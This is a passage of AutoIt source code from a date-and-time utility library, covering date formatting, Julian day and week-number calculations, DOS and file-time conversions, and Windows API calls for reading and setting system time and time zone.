			Else
				$inextweekdaynum = $iweekdaynum + 1
			EndIf
			Return $inextweekdaynum
	EndSelect
EndFunc

Func _datenextmonthnum($imonthnum)
	Select 
		Case NOT StringIsInt($imonthnum)
			Return SetError(1, 0, 0)
		Case NOT __dateismonth($imonthnum)
			Return SetError(2, 0, 0)
		Case Else
			Local $inextmonthnum
			If $imonthnum = 12 Then
				$inextmonthnum = 1
			Else
				$inextmonthnum = $imonthnum + 1
			EndIf
			$inextmonthnum = StringFormat("%02d", $inextmonthnum)
			Return $inextmonthnum
	EndSelect
EndFunc

Func _datenextmonthyear($imonthnum, $iyear)
	Select 
		Case NOT StringIsInt($imonthnum) OR NOT StringIsInt($iyear)
			Return SetError(1, 0, 0)
		Case NOT __dateismonth($imonthnum)
			Return SetError(2, 0, 0)
		Case Else
			Local $inextyear
			If $imonthnum = 12 Then
				$inextyear = $iyear + 1
			Else
				$inextyear = $iyear
			EndIf
			$inextyear = StringFormat("%04d", $inextyear)
			Return $inextyear
	EndSelect
EndFunc

Func _datetimeformat($sdate, $stype)
	Local $asdatepart[4], $astimepart[4]
	Local $stempdate = "", $stemptime = ""
	Local $sam, $spm, $stempstring = ""
	If NOT _dateisvalid($sdate) Then
		Return SetError(1, 0, "")
	EndIf
	If $stype < 0 OR $stype > 5 OR NOT IsInt($stype) Then
		Return SetError(2, 0, "")
	EndIf
	_datetimesplit($sdate, $asdatepart, $astimepart)
	Switch $stype
		Case 0
			$stempstring = _winapi_getlocaleinfo($locale_user_default, $locale_sshortdate)
			If NOT @error AND NOT ($stempstring = "") Then
				$stempdate = $stempstring
			Else
				$stempdate = "M/d/yyyy"
			EndIf
			If $astimepart[0] > 1 Then
				$stempstring = _winapi_getlocaleinfo($locale_user_default, $locale_stimeformat)
				If NOT @error AND NOT ($stempstring = "") Then
					$stemptime = $stempstring
				Else
					$stemptime = "h:mm:ss tt"
				EndIf
			EndIf
		Case 1
			$stempstring = _winapi_getlocaleinfo($locale_user_default, $locale_slongdate)
			If NOT @error AND NOT ($stempstring = "") Then
				$stempdate = $stempstring
			Else
				$stempdate = "dddd, MMMM dd, yyyy"
			EndIf
		Case 2
			$stempstring = _winapi_getlocaleinfo($locale_user_default, $locale_sshortdate)
			If NOT @error AND NOT ($stempstring = "") Then
				$stempdate = $stempstring
			Else
				$stempdate = "M/d/yyyy"
			EndIf
		Case 3
			If $astimepart[0] > 1 Then
				$stempstring = _winapi_getlocaleinfo($locale_user_default, $locale_stimeformat)
				If NOT @error AND NOT ($stempstring = "") Then
					$stemptime = $stempstring
				Else
					$stemptime = "h:mm:ss tt"
				EndIf
			EndIf
		Case 4
			If $astimepart[0] > 1 Then
				$stemptime = "hh:mm"
			EndIf
		Case 5
			If $astimepart[0] > 1 Then
				$stemptime = "hh:mm:ss"
			EndIf
	EndSwitch
	If $stempdate <> "" Then
		$stempstring = _winapi_getlocaleinfo($locale_user_default, $locale_sdate)
		If NOT @error AND NOT ($stempstring = "") Then
			$stempdate = StringReplace($stempdate, "/", $stempstring)
		EndIf
		Local $iwday = _datetodayofweek($asdatepart[1], $asdatepart[2], $asdatepart[3])
		$asdatepart[3] = StringRight("0" & $asdatepart[3], 2)
		$asdatepart[2] = StringRight("0" & $asdatepart[2], 2)
		$stempdate = StringReplace($stempdate, "d", "@")
		$stempdate = StringReplace($stempdate, "m", "#")
		$stempdate = StringReplace($stempdate, "y", "&")
		$stempdate = StringReplace($stempdate, "@@@@", _datedayofweek($iwday, 0))
		$stempdate = StringReplace($stempdate, "@@@", _datedayofweek($iwday, 1))
		$stempdate = StringReplace($stempdate, "@@", $asdatepart[3])
		$stempdate = StringReplace($stempdate, "@", StringReplace(StringLeft($asdatepart[3], 1), "0", "") & StringRight($asdatepart[3], 1))
		$stempdate = StringReplace($stempdate, "####", _datetomonth($asdatepart[2], 0))
		$stempdate = StringReplace($stempdate, "###", _datetomonth($asdatepart[2], 1))
		$stempdate = StringReplace($stempdate, "##", $asdatepart[2])
		$stempdate = StringReplace($stempdate, "#", StringReplace(StringLeft($asdatepart[2], 1), "0", "") & StringRight($asdatepart[2], 1))
		$stempdate = StringReplace($stempdate, "&&&&", $asdatepart[1])
		$stempdate = StringReplace($stempdate, "&&", StringRight($asdatepart[1], 2))
	EndIf
	If $stemptime <> "" Then
		$stempstring = _winapi_getlocaleinfo($locale_user_default, $locale_s1159)
		If NOT @error AND NOT ($stempstring = "") Then
			$sam = $stempstring
		Else
			$sam = "AM"
		EndIf
		$stempstring = _winapi_getlocaleinfo($locale_user_default, $locale_s2359)
		If NOT @error AND NOT ($stempstring = "") Then
			$spm = $stempstring
		Else
			$spm = "PM"
		EndIf
		$stempstring = _winapi_getlocaleinfo($locale_user_default, $locale_stime)
		If NOT @error AND NOT ($stempstring = "") Then
			$stemptime = StringReplace($stemptime, ":", $stempstring)
		EndIf
		If StringInStr($stemptime, "tt") Then
			If $astimepart[1] < 12 Then
				$stemptime = StringReplace($stemptime, "tt", $sam)
				If $astimepart[1] = 0 Then $astimepart[1] = 12
			Else
				$stemptime = StringReplace($stemptime, "tt", $spm)
				If $astimepart[1] > 12 Then $astimepart[1] = $astimepart[1] - 12
			EndIf
		EndIf
		$astimepart[1] = StringRight("0" & $astimepart[1], 2)
		$astimepart[2] = StringRight("0" & $astimepart[2], 2)
		$astimepart[3] = StringRight("0" & $astimepart[3], 2)
		$stemptime = StringReplace($stemptime, "hh", StringFormat("%02d", $astimepart[1]))
		$stemptime = StringReplace($stemptime, "h", StringReplace(StringLeft($astimepart[1], 1), "0", "") & StringRight($astimepart[1], 1))
		$stemptime = StringReplace($stemptime, "mm", StringFormat("%02d", $astimepart[2]))
		$stemptime = StringReplace($stemptime, "ss", StringFormat("%02d", $astimepart[3]))
		$stempdate = StringStripWS($stempdate & " " & $stemptime, $str_stripleading + $str_striptrailing)
	EndIf
	Return $stempdate
EndFunc

Func _datetimesplit($sdate, ByRef $asdatepart, ByRef $itimepart)
	Local $sdatetime = StringSplit($sdate, " T")
	If $sdatetime[0] > 0 Then $asdatepart = StringSplit($sdatetime[1], "/-.")
	If $sdatetime[0] > 1 Then
		$itimepart = StringSplit($sdatetime[2], ":")
		If UBound($itimepart) < 4 Then ReDim $itimepart[4]
	Else
		Dim $itimepart[4]
	EndIf
	If UBound($asdatepart) < 4 Then ReDim $asdatepart[4]
	For $x = 1 To 3
		If StringIsInt($asdatepart[$x]) Then
			$asdatepart[$x] = Int($asdatepart[$x])
		Else
			$asdatepart[$x] = -1
		EndIf
		If StringIsInt($itimepart[$x]) Then
			$itimepart[$x] = Int($itimepart[$x])
		Else
			$itimepart[$x] = 0
		EndIf
	Next
	Return 1
EndFunc

Func _datetodayofweek($iyear, $imonth, $iday)
	If NOT _dateisvalid($iyear & "/" & $imonth & "/" & $iday) Then
		Return SetError(1, 0, "")
	EndIf
	Local $i_factora = Int((14 - $imonth) / 12)
	Local $i_factory = $iyear - $i_factora
	Local $i_factorm = $imonth + (12 * $i_factora) - 2
	Local $i_factord = Mod($iday + $i_factory + Int($i_factory / 4) - Int($i_factory / 100) + Int($i_factory / 400) + Int((31 * $i_factorm) / 12), 7)
	Return $i_factord + 1
EndFunc

Func _datetodayofweekiso($iyear, $imonth, $iday)
	Local $idow = _datetodayofweek($iyear, $imonth, $iday)
	If @error Then
		Return SetError(1, 0, "")
	EndIf
	If $idow >= 2 Then Return $idow - 1
	Return 7
EndFunc

Func _datetodayvalue($iyear, $imonth, $iday)
	If NOT _dateisvalid(StringFormat("%04d/%02d/%02d", $iyear, $imonth, $iday)) Then
		Return SetError(1, 0, "")
	EndIf
	If $imonth < 3 Then
		$imonth = $imonth + 12
		$iyear = $iyear - 1
	EndIf
	Local $i_factora = Int($iyear / 100)
	Local $i_factorb = Int($i_factora / 4)
	Local $i_factorc = 2 - $i_factora + $i_factorb
	Local $i_factore = Int(1461 * ($iyear + 4716) / 4)
	Local $i_factorf = Int(153 * ($imonth + 1) / 5)
	Local $ijuliandate = $i_factorc + $iday + $i_factore + $i_factorf - 1524.5
	Return $ijuliandate
EndFunc

Func _datetomonth($imonnum, $iformat = Default)
	If $iformat = Default Then $iformat = 0
	$imonnum = Int($imonnum)
	If NOT __dateismonth($imonnum) Then Return SetError(1, 0, "")
	Local $tsystemtime = DllStructCreate($tagsystemtime)
	DllStructSetData($tsystemtime, "Year", @YEAR)
	DllStructSetData($tsystemtime, "Month", $imonnum)
	DllStructSetData($tsystemtime, "Day", 1)
	Return _winapi_getdateformat(BitAND($iformat, $dmw_locale_longname) ? $locale_user_default : $locale_invariant, $tsystemtime, 0, BitAND($iformat, $dmw_shortname) ? "MMM" : "MMMM")
EndFunc

Func _dayvaluetodate($ijuliandate, ByRef $iyear, ByRef $imonth, ByRef $iday)
	If $ijuliandate < 0 OR NOT IsNumber($ijuliandate) Then
		Return SetError(1, 0, 0)
	EndIf
	Local $i_factorz = Int($ijuliandate + 0.5)
	Local $i_factorw = Int(($i_factorz - 1867216.25) / 36524.25)
	Local $i_factorx = Int($i_factorw / 4)
	Local $i_factora = $i_factorz + 1 + $i_factorw - $i_factorx
	Local $i_factorb = $i_factora + 1524
	Local $i_factorc = Int(($i_factorb - 122.1) / 365.25)
	Local $i_factord = Int(365.25 * $i_factorc)
	Local $i_factore = Int(($i_factorb - $i_factord) / 30.6001)
	Local $i_factorf = Int(30.6001 * $i_factore)
	$iday = $i_factorb - $i_factord - $i_factorf
	If $i_factore - 1 < 13 Then
		$imonth = $i_factore - 1
	Else
		$imonth = $i_factore - 13
	EndIf
	If $imonth < 3 Then
		$iyear = $i_factorc - 4715
	Else
		$iyear = $i_factorc - 4716
	EndIf
	$iyear = StringFormat("%04d", $iyear)
	$imonth = StringFormat("%02d", $imonth)
	$iday = StringFormat("%02d", $iday)
	Return $iyear & "/" & $imonth & "/" & $iday
EndFunc

Func _date_juliandayno($iyear, $imonth, $iday)
	Local $sfulldate = StringFormat("%04d/%02d/%02d", $iyear, $imonth, $iday)
	If NOT _dateisvalid($sfulldate) Then
		Return SetError(1, 0, "")
	EndIf
	Local $ijday = 0
	Local $aidaysinmonth = _daysinmonth($iyear)
	For $icntr = 1 To $imonth - 1
		$ijday = $ijday + $aidaysinmonth[$icntr]
	Next
	$ijday = ($iyear * 1000) + ($ijday + $iday)
	Return $ijday
EndFunc

Func _juliantodate($ijday, $ssep = "/")
	Local $iyear = Int($ijday / 1000)
	Local $idays = Mod($ijday, 1000)
	Local $imaxdays = 365
	If _dateisleapyear($iyear) Then $imaxdays = 366
	If $idays > $imaxdays Then
		Return SetError(1, 0, "")
	EndIf
	Local $aidaysinmonth = _daysinmonth($iyear)
	Local $imonth = 1
	While $idays > $aidaysinmonth[$imonth]
		$idays = $idays - $aidaysinmonth[$imonth]
		$imonth = $imonth + 1
	WEnd
	Return StringFormat("%04d%s%02d%s%02d", $iyear, $ssep, $imonth, $ssep, $idays)
EndFunc

Func _now()
	Return _datetimeformat(@YEAR & "/" & @MON & "/" & @MDAY & " " & @HOUR & ":" & @MIN & ":" & @SEC, 0)
EndFunc

Func _nowcalc()
	Return @YEAR & "/" & @MON & "/" & @MDAY & " " & @HOUR & ":" & @MIN & ":" & @SEC
EndFunc

Func _nowcalcdate()
	Return @YEAR & "/" & @MON & "/" & @MDAY
EndFunc

Func _nowdate()
	Return _datetimeformat(@YEAR & "/" & @MON & "/" & @MDAY, 0)
EndFunc

Func _nowtime($stype = 3)
	If $stype < 3 OR $stype > 5 Then $stype = 3
	Return _datetimeformat(@YEAR & "/" & @MON & "/" & @MDAY & " " & @HOUR & ":" & @MIN & ":" & @SEC, $stype)
EndFunc

Func _setdate($iday, $imonth = 0, $iyear = 0)
	If $iyear = 0 Then $iyear = @YEAR
	If $imonth = 0 Then $imonth = @MON
	If NOT _dateisvalid($iyear & "/" & $imonth & "/" & $iday) Then Return 1
	Local $tsystemtime = DllStructCreate($tagsystemtime)
	DllCall("kernel32.dll", "none", "GetLocalTime", "struct*", $tsystemtime)
	If @error Then Return SetError(@error, @extended, 0)
	DllStructSetData($tsystemtime, "Day", $iday)
	If $imonth > 0 Then DllStructSetData($tsystemtime, "Month", $imonth)
	If $iyear > 0 Then DllStructSetData($tsystemtime, "Year", $iyear)
	Local $iretval = _date_time_setlocaltime($tsystemtime)
	If @error Then Return SetError(@error + 10, @extended, 0)
	Return Int($iretval)
EndFunc

Func _settime($ihour, $iminute, $isecond = 0)
	If $ihour < 0 OR $ihour > 23 Then Return 1
	If $iminute < 0 OR $iminute > 59 Then Return 1
	If $isecond < 0 OR $isecond > 59 Then Return 1
	Local $tsystemtime = DllStructCreate($tagsystemtime)
	DllCall("kernel32.dll", "none", "GetLocalTime", "struct*", $tsystemtime)
	If @error Then Return SetError(@error, @extended, 0)
	DllStructSetData($tsystemtime, "Hour", $ihour)
	DllStructSetData($tsystemtime, "Minute", $iminute)
	If $isecond > 0 Then DllStructSetData($tsystemtime, "MSeconds", $isecond)
	Local $iretval = _date_time_setlocaltime($tsystemtime)
	If @error Then Return SetError(@error + 10, @extended, 0)
	Return Int($iretval)
EndFunc

Func _tickstotime($iticks, ByRef $ihours, ByRef $imins, ByRef $isecs)
	If Number($iticks) > 0 Then
		$iticks = Int($iticks / 1000)
		$ihours = Int($iticks / 3600)
		$iticks = Mod($iticks, 3600)
		$imins = Int($iticks / 60)
		$isecs = Mod($iticks, 60)
		Return 1
	ElseIf Number($iticks) = 0 Then
		$ihours = 0
		$iticks = 0
		$imins = 0
		$isecs = 0
		Return 1
	Else
		Return SetError(1, 0, 0)
	EndIf
EndFunc

Func _timetoticks($ihours = @HOUR, $imins = @MIN, $isecs = @SEC)
	If StringIsInt($ihours) AND StringIsInt($imins) AND StringIsInt($isecs) Then
		Local $iticks = 1000 * ((3600 * $ihours) + (60 * $imins) + $isecs)
		Return $iticks
	Else
		Return SetError(1, 0, 0)
	EndIf
EndFunc

Func _weeknumberiso($iyear = @YEAR, $imonth = @MON, $iday = @MDAY)
	If $iday > 31 OR $iday < 1 Then
		Return SetError(1, 0, -1)
	ElseIf NOT __dateismonth($imonth) Then
		Return SetError(2, 0, -1)
	ElseIf $iyear < 1 OR $iyear > 2999 Then
		Return SetError(3, 0, -1)
	EndIf
	Local $idow = _datetodayofweekiso($iyear, $imonth, $iday) - 1
	Local $idow0101 = _datetodayofweekiso($iyear, 1, 1) - 1
	If ($imonth = 1 AND 3 < $idow0101 AND $idow0101 < 7 - ($iday - 1)) Then
		$idow = $idow0101 - 1
		$idow0101 = _datetodayofweekiso($iyear - 1, 1, 1) - 1
		$imonth = 12
		$iday = 31
		$iyear = $iyear - 1
	ElseIf ($imonth = 12 AND 30 - ($iday - 1) < _datetodayofweekiso($iyear + 1, 1, 1) - 1 AND _datetodayofweekiso($iyear + 1, 1, 1) - 1 < 4) Then
		Return 1
	EndIf
	Return Int((_datetodayofweekiso($iyear, 1, 1) - 1 < 4) + 4 * ($imonth - 1) + (2 * ($imonth - 1) + ($iday - 1) + $idow0101 - $idow + 6) * 36 / 256)
EndFunc

Func _weeknumber($iyear = @YEAR, $imonth = @MON, $iday = @MDAY, $iweekstart = 1)
	If $iday > 31 OR $iday < 1 Then
		Return SetError(1, 0, -1)
	ElseIf NOT __dateismonth($imonth) Then
		Return SetError(3, 0, -1)
	ElseIf $iyear < 1 OR $iyear > 2999 Then
		Return SetError(4, 0, -1)
	ElseIf $iweekstart < 1 OR $iweekstart > 2 Then
		Return SetError(2, 0, -1)
	EndIf
	Local $istartweek1, $iendweek1
	Local $idow0101 = _datetodayofweekiso($iyear, 1, 1)
	Local $idate = $iyear & "/" & $imonth & "/" & $iday
	If $iweekstart = 1 Then
		If $idow0101 = 6 Then
			$istartweek1 = 0
		Else
			$istartweek1 = -1 * $idow0101 - 1
		EndIf
		$iendweek1 = $istartweek1 + 6
	Else
		$istartweek1 = $idow0101 * -1
		$iendweek1 = $istartweek1 + 6
	EndIf
	Local $istartweek1ny
	Local $iendweek1date = _dateadd("d", $iendweek1, $iyear & "/01/01")
	Local $idow0101ny = _datetodayofweekiso($iyear + 1, 1, 1)
	If $iweekstart = 1 Then
		If $idow0101ny = 6 Then
			$istartweek1ny = 0
		Else
			$istartweek1ny = -1 * $idow0101ny - 1
		EndIf
	Else
		$istartweek1ny = $idow0101ny * -1
	EndIf
	Local $istartweek1dateny = _dateadd("d", $istartweek1ny, $iyear + 1 & "/01/01")
	Local $icurrdatediff = _datediff("d", $iendweek1date, $idate) - 1
	Local $icurrdatediffny = _datediff("d", $istartweek1dateny, $idate)
	If $icurrdatediff >= 0 AND $icurrdatediffny < 0 Then Return 2 + Int($icurrdatediff / 7)
	If $icurrdatediff < 0 OR $icurrdatediffny >= 0 Then Return 1
EndFunc

Func _daysinmonth($iyear)
	Local $adays[13] = [0, 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
	If _dateisleapyear($iyear) Then $adays[2] = 29
	Return $adays
EndFunc

Func __date_time_clonesystemtime($psystemtime)
	Local $tsystemtime1 = DllStructCreate($tagsystemtime, $psystemtime)
	Local $tsystemtime2 = DllStructCreate($tagsystemtime)
	DllStructSetData($tsystemtime2, "Month", DllStructGetData($tsystemtime1, "Month"))
	DllStructSetData($tsystemtime2, "Day", DllStructGetData($tsystemtime1, "Day"))
	DllStructSetData($tsystemtime2, "Year", DllStructGetData($tsystemtime1, "Year"))
	DllStructSetData($tsystemtime2, "Hour", DllStructGetData($tsystemtime1, "Hour"))
	DllStructSetData($tsystemtime2, "Minute", DllStructGetData($tsystemtime1, "Minute"))
	DllStructSetData($tsystemtime2, "Second", DllStructGetData($tsystemtime1, "Second"))
	DllStructSetData($tsystemtime2, "MSeconds", DllStructGetData($tsystemtime1, "MSeconds"))
	DllStructSetData($tsystemtime2, "DOW", DllStructGetData($tsystemtime1, "DOW"))
	Return $tsystemtime2
EndFunc

Func _date_time_comparefiletime($pfiletime1, $pfiletime2)
	Local $aresult = DllCall("kernel32.dll", "long", "CompareFileTime", "ptr", $pfiletime1, "ptr", $pfiletime2)
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _date_time_dosdatetimetofiletime($ifatdate, $ifattime)
	Local $ttime = DllStructCreate($tagfiletime)
	Local $aresult = DllCall("kernel32.dll", "bool", "DosDateTimeToFileTime", "word", $ifatdate, "word", $ifattime, "struct*", $ttime)
	If @error Then Return SetError(@error, @extended, 0)
	Return SetExtended($aresult[0], $ttime)
EndFunc

Func _date_time_dosdatetoarray($idosdate)
	Local $adate[3]
	$adate[0] = BitAND($idosdate, 31)
	$adate[1] = BitAND(BitShift($idosdate, 5), 15)
	$adate[2] = BitAND(BitShift($idosdate, 9), 63) + 1980
	Return $adate
EndFunc

Func _date_time_dosdatetimetoarray($idosdate, $idostime)
	Local $adate[6]
	$adate[0] = BitAND($idosdate, 31)
	$adate[1] = BitAND(BitShift($idosdate, 5), 15)
	$adate[2] = BitAND(BitShift($idosdate, 9), 63) + 1980
	$adate[5] = BitAND($idostime, 31) * 2
	$adate[4] = BitAND(BitShift($idostime, 5), 63)
	$adate[3] = BitAND(BitShift($idostime, 11), 31)
	Return $adate
EndFunc

Func _date_time_dosdatetimetostr($idosdate, $idostime)
	Local $adate = _date_time_dosdatetimetoarray($idosdate, $idostime)
	Return StringFormat("%02d/%02d/%04d %02d:%02d:%02d", $adate[0], $adate[1], $adate[2], $adate[3], $adate[4], $adate[5])
EndFunc

Func _date_time_dosdatetostr($idosdate)
	Local $adate = _date_time_dosdatetoarray($idosdate)
	Return StringFormat("%02d/%02d/%04d", $adate[0], $adate[1], $adate[2])
EndFunc

Func _date_time_dostimetoarray($idostime)
	Local $atime[3]
	$atime[2] = BitAND($idostime, 31) * 2
	$atime[1] = BitAND(BitShift($idostime, 5), 63)
	$atime[0] = BitAND(BitShift($idostime, 11), 31)
	Return $atime
EndFunc

Func _date_time_dostimetostr($idostime)
	Local $atime = _date_time_dostimetoarray($idostime)
	Return StringFormat("%02d:%02d:%02d", $atime[0], $atime[1], $atime[2])
EndFunc

Func _date_time_encodefiletime($imonth, $iday, $iyear, $ihour = 0, $iminute = 0, $isecond = 0, $imseconds = 0)
	Local $tsystemtime = _date_time_encodesystemtime($imonth, $iday, $iyear, $ihour, $iminute, $isecond, $imseconds)
	Return _date_time_systemtimetofiletime($tsystemtime)
EndFunc

Func _date_time_encodesystemtime($imonth, $iday, $iyear, $ihour = 0, $iminute = 0, $isecond = 0, $imseconds = 0)
	Local $tsystemtime = DllStructCreate($tagsystemtime)
	DllStructSetData($tsystemtime, "Month", $imonth)
	DllStructSetData($tsystemtime, "Day", $iday)
	DllStructSetData($tsystemtime, "Year", $iyear)
	DllStructSetData($tsystemtime, "Hour", $ihour)
	DllStructSetData($tsystemtime, "Minute", $iminute)
	DllStructSetData($tsystemtime, "Second", $isecond)
	DllStructSetData($tsystemtime, "MSeconds", $imseconds)
	Return $tsystemtime
EndFunc

Func _date_time_filetimetoarray(ByRef $tfiletime)
	If ((DllStructGetData($tfiletime, 1) + DllStructGetData($tfiletime, 2)) = 0) Then Return SetError(10, 0, 0)
	Local $tsystemtime = _date_time_filetimetosystemtime($tfiletime)
	If @error Then Return SetError(@error, @extended, 0)
	Return _date_time_systemtimetoarray($tsystemtime)
EndFunc

Func _date_time_filetimetostr(ByRef $tfiletime, $bfmt = 0)
	Local $adate = _date_time_filetimetoarray($tfiletime)
	If @error Then Return SetError(@error, @extended, "")
	If $bfmt Then
		Return StringFormat("%04d/%02d/%02d %02d:%02d:%02d", $adate[2], $adate[0], $adate[1], $adate[3], $adate[4], $adate[5])
	Else
		Return StringFormat("%02d/%02d/%04d %02d:%02d:%02d", $adate[0], $adate[1], $adate[2], $adate[3], $adate[4], $adate[5])
	EndIf
EndFunc

Func _date_time_filetimetodosdatetime($pfiletime)
	Local $adate[2]
	Local $aresult = DllCall("kernel32.dll", "bool", "FileTimeToDosDateTime", "ptr", $pfiletime, "word*", 0, "word*", 0)
	If @error Then Return SetError(@error, @extended, $adate)
	$adate[0] = $aresult[2]
	$adate[1] = $aresult[3]
	Return SetExtended($aresult[0], $adate)
EndFunc

Func _date_time_filetimetolocalfiletime($pfiletime)
	Local $tlocal = DllStructCreate($tagfiletime)
	Local $aresult = DllCall("kernel32.dll", "bool", "FileTimeToLocalFileTime", "struct*", $pfiletime, "struct*", $tlocal)
	If @error Then Return SetError(@error, @extended, 0)
	Return SetExtended($aresult[0], $tlocal)
EndFunc

Func _date_time_filetimetosystemtime($pfiletime)
	Local $tsysttime = DllStructCreate($tagsystemtime)
	Local $aresult = DllCall("kernel32.dll", "bool", "FileTimeToSystemTime", "struct*", $pfiletime, "struct*", $tsysttime)
	If @error Then Return SetError(@error, @extended, 0)
	Return SetExtended($aresult[0], $tsysttime)
EndFunc

Func _date_time_getfiletime($hfile)
	Local $adate[3]
	$adate[0] = DllStructCreate($tagfiletime)
	$adate[1] = DllStructCreate($tagfiletime)
	$adate[2] = DllStructCreate($tagfiletime)
	Local $aresult = DllCall("Kernel32.dll", "bool", "GetFileTime", "handle", $hfile, "struct*", $adate[0], "struct*", $adate[1], "struct*", $adate[2])
	If @error Then Return SetError(@error, @extended, 0)
	Return SetExtended($aresult[0], $adate)
EndFunc

Func _date_time_getlocaltime()
	Local $tsysttime = DllStructCreate($tagsystemtime)
	DllCall("kernel32.dll", "none", "GetLocalTime", "struct*", $tsysttime)
	If @error Then Return SetError(@error, @extended, 0)
	Return $tsysttime
EndFunc

Func _date_time_getsystemtime()
	Local $tsysttime = DllStructCreate($tagsystemtime)
	DllCall("kernel32.dll", "none", "GetSystemTime", "struct*", $tsysttime)
	If @error Then Return SetError(@error, @extended, 0)
	Return $tsysttime
EndFunc

Func _date_time_getsystemtimeadjustment()
	Local $ainfo[3]
	Local $aresult = DllCall("kernel32.dll", "bool", "GetSystemTimeAdjustment", "dword*", 0, "dword*", 0, "bool*", 0)
	If @error Then Return SetError(@error, @extended, 0)
	$ainfo[0] = $aresult[1]
	$ainfo[1] = $aresult[2]
	$ainfo[2] = $aresult[3] <> 0
	Return SetExtended($aresult[0], $ainfo)
EndFunc

Func _date_time_getsystemtimeasfiletime()
	Local $tfiletime = DllStructCreate($tagfiletime)
	DllCall("kernel32.dll", "none", "GetSystemTimeAsFileTime", "struct*", $tfiletime)
	If @error Then Return SetError(@error, @extended, 0)
	Return $tfiletime
EndFunc

Func _date_time_getsystemtimes()
	Local $ainfo[3]
	$ainfo[0] = DllStructCreate($tagfiletime)
	$ainfo[1] = DllStructCreate($tagfiletime)
	$ainfo[2] = DllStructCreate($tagfiletime)
	Local $aresult = DllCall("kernel32.dll", "bool", "GetSystemTimes", "struct*", $ainfo[0], "struct*", $ainfo[1], "struct*", $ainfo[2])
	If @error Then Return SetError(@error, @extended, 0)
	Return SetExtended($aresult[0], $ainfo)
EndFunc

Func _date_time_gettickcount()
	Local $aresult = DllCall("kernel32.dll", "dword", "GetTickCount")
	If @error Then Return SetError(@error, @extended, 0)
	Return $aresult[0]
EndFunc

Func _date_time_gettimezoneinformation()
	Local $ttimezone = DllStructCreate($tagtime_zone_information)
	Local $aresult = DllCall("kernel32.dll", "dword", "GetTimeZoneInformation", "struct*", $ttimezone)
	If @error OR $aresult[0] = -1 Then Return SetError(@error, @extended, 0)
	Local $ainfo[8]
	$ainfo[0] = $aresult[0]
	$ainfo[1] = DllStructGetData($ttimezone, "Bias")
	$ainfo[2] = _winapi_widechartomultibyte(DllStructGetPtr($ttimezone, "StdName"))
	$ainfo[3] = __date_time_clonesystemtime(DllStructGetPtr($ttimezone, "StdDate"))
	$ainfo[4] = DllStructGetData($ttimezone, "StdBias")
	$ainfo[5] = _winapi_widechartomultibyte(DllStructGetPtr($ttimezone, "DayName"))
	$ainfo[6] = __date_time_clonesystemtime(DllStructGetPtr($ttimezone, "DayDate"))
	$ainfo[7] = DllStructGetData($ttimezone, "DayBias")
	Return $ainfo
EndFunc

Func _date_time_localfiletimetofiletime($plocaltime)
	Local $tfiletime = DllStructCreate($tagfiletime)
	Local $aresult = DllCall("kernel32.dll", "bool", "LocalFileTimeToFileTime", "ptr", $plocaltime, "struct*", $tfiletime)
	If @error Then Return SetError(@error, @extended, 0)
	Return SetExtended($aresult[0], $tfiletime)
EndFunc

Func _date_time_setfiletime($hfile, $pcreatetime, $plastaccess, $plastwrite)
	Local $aresult = DllCall("kernel32.dll", "bool", "SetFileTime", "handle", $hfile, "ptr", $pcreatetime, "ptr", $plastaccess, "ptr", $plastwrite)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _date_time_setlocaltime($psystemtime)
	Local $aresult = DllCall("kernel32.dll", "bool", "SetLocalTime", "struct*", $psystemtime)
	If @error OR NOT $aresult[0] Then Return SetError(@error + 10, @extended, False)
	$aresult = DllCall("kernel32.dll", "bool", "SetLocalTime", "struct*", $psystemtime)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _date_time_setsystemtime($psystemtime)
	Local $aresult = DllCall("kernel32.dll", "bool", "SetSystemTime", "ptr", $psystemtime)
	If @error Then Return SetError(@error, @extended, False)
	Return $aresult[0]
EndFunc

Func _date_time_setsystemtimeadjustment($iadjustment, $bdisabled)
	Local $htoken = _security__openthreadtokenex(BitOR($token_adjust_privileges, $token_query))
	If @error Then Return SetError(@error + 10, @extended, False)
	_security__setprivilege($htoken, "SeSystemtimePrivilege", True)
	Local $ierror = @error
	Local $ilasterror = @extended
	Local $bret = False
	If NOT @error Then
		Local $aresult = DllCall("kernel32.dll", "bool", "SetSystemTimeAdjustment", "dword", $iadjustment, "bool", $bdisabled)
		If @error Then
			$ierror = @error
			$ilasterror = @extended
		ElseIf $aresult[0] Then
			$bret = True
		Else
			$ierror = 20
			$ilasterror = _winapi_getlasterror()
		EndIf
		_security__setprivilege($htoken, "SeSystemtimePrivilege", False)
		If NOT $ierror AND @error Then $ierror = 22
	EndIf
	_winapi_closehandle($htoken)
	Return SetError($ierror, $ilasterror, $bret)
EndFunc

Func _date_time_settimezoneinformation($ibias, $sstdname, $tstddate, $istdbias, $sdayname, $tdaydate, $idaybias)
	Local $tstdname = _winapi_multibytetowidechar($sstdname)
	Local $tdayname = _winapi_multibytetowidechar($sdayname)
	Local $tzoneinfo = DllStructCreate($tagtime_zone_information)
	DllStructSetData($tzoneinfo, "Bias", $ibias)
	DllStructSetData($tzoneinfo, "StdName", DllStructGetData($tstdname, 1))
	_memmovememory($tstddate, DllStructGetPtr($tzoneinfo, "StdDate"), DllStructGetSize($tstddate))
	DllStructSetData($tzoneinfo, "StdBias", $istdbias)
	DllStructSetData($tzoneinfo, "DayName", DllStructGetData($tdayname, 1))
	_memmovememory($tdaydate, DllStructGetPtr($tzoneinfo, "DayDate"), DllStructGetSize($tdaydate))
	DllStructSetData($tzoneinfo, "DayBias", $idaybias)
	Local $htoken = _security__openthreadtokenex(BitOR($token_adjust_privileges, $token_query))
	If @error Then Return SetError(@error + 10, @extended, False)
	_security__setprivilege($htoken, "SeSystemtimePrivilege", True)
	Local $ierror = @error
	Local $ilasterror = @extended
	Local $bret = False
	If NOT @error Then
		Local $aresult = DllCall("kernel32.dll", "bool", "SetTimeZoneInformation", "struct*", $tzoneinfo)
		If @error Then
			$ierror = @error
			$ilasterror = @extended
		ElseIf $aresult[0] Then
			$ilasterror = 0
			$bret = True
		Else
			$ierror = 20
			$ilasterror = _winapi_getlasterror()
		EndIf
		_security__setprivilege($htoken, "SeSystemtimePrivilege", False)
		If NOT $ierror AND @error Then $ierror = 22
	EndIf
	_winapi_closehandle($htoken)
	Return SetError($ierror, $ilasterror, $bret)
EndFunc

Func _date_time_systemtimetoarray(ByRef $tsystemtime)
	Local $ainfo[8]
